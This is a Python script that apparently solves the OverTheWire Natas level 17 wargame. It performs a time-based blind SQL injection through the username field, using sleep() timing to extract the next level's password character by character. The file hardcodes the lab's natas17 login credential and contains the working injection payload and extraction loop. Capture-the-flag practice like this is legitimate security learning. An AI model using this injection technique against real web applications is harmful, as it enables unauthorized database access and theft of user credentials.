#!/usr/bin/python

import requests
import sys
import string
import time

# base: natas18" and substring(password, 1, 1) like binary "a

url = 'http://natas17.natas.labs.overthewire.org/'
password_length = 32
space = string.ascii_letters + "1234567890"

s = requests.Session()
s.auth = (u'natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')


# full payload example: 
# select * from Test where id = "1" and if(substring(title, 1, 1) like binary "k", sleep(10), "");
# payload = 'natas18" and if(substring(password, 1, 1) like binary "x", sleep(10), "") ; #'

# b_seconds = time.time()
# res = s.post(url, data={"username": payload})
# a_seconds = time.time()
# print(a_seconds - b_seconds)

password = ''
for i in range(1, password_length + 1):
    for k in space:
        sys.stdout.write(f"\rtrying: {password+k}")
        b_seconds = time.time()
        res = s.post(url, data={"username": f'natas18" and if(substring(password, {i}, 1) like binary "{k}", sleep(7), "") ; #'})
        a_seconds = time.time()
        
        if (a_seconds - b_seconds) > 7:
            password += k
            break

print(f"The password is {password}")
